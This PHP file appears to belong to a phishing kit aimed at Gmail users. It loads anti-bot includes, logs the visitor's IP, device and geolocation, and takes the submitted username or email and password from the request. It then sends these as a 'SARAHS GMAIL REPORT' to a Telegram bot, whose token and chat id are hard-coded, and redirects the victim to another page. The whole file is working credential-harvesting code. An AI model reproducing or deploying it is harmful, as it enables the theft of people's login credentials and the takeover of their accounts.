<?php
session_start();
include "/anti/anti1.php";
include "/anti/anti2.php";
include "/anti/anti3.php";
include "/anti/anti4.php";
include "/anti/anti5.php";
include "/anti/anti6.php";
include "/anti/anti7.php";
include "/anti/anti8.php";
include "/control.php";
include "/connect/out.php";
include "/mods/antibot.php";


$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS()
{
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }

    return $browser;
}

$user_os = getOS();
$user_browser = getBrowser();

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file1 = 'combo.txt';
$file2 = 'master.log';
$ip = "" . $PublicIP;
$uaget = "" . $user_agent;
$bsr = "" . $user_browser;
$uos = "" . $user_os;
$ust = explode(" ", $user_agent);
$vr = $ust[3];
$ver = str_replace(")", "", $vr);
$version = "Version              : " . $ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
} else {
    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
    $tp = $details['type'];
    $cn = $details['country_phone'];
    $is = $details['isp'];
    $la = $details['latitude'];
    $lp = $details['longitude'];
    $crn = $details['currency'];
    $type = $tp;
    $isp = $is;
    $bank = "INTERACT WITH YOUR NEIGBORS![OPEN]";
    $LL = "+";
    $currency = "" . $full_date;
    $lh = "|";
    $li = ",";
}

$message = "|🟡 |🔒 SARAHS GMAIL REPORT 🔒 |🟡 |\n|IP                   :  " . $ip . "\n|Device           :  " . $uos . $lh . $bsr . "\n|City                :  " . $city .  "\n|🟡|🔒 SARAHS GMAIL REPORT 🔒 |🟡|\nUSER : " . $_GET['username'] . "" . $_GET['user'] . "" . $_GET['email'] . "\nPASS : " . $_GET['password'] . "\n\n|🟡|🔒 SARAHS GMAIL REPORT 🔒 |🟡|\n|USERAGENT:  " . $_SERVER['HTTP_USER_AGENT'] . "\n";


$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data = [
    'chat_id' => '-905747586',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    
          

$options = array(
    'http' => array(
        'method'  => 'POST',
        'content' => http_build_query($data),
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
    )
);
$context  = stream_context_create($options);
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage", false, $context);


header("Location: 040150.php");
exit;
?>
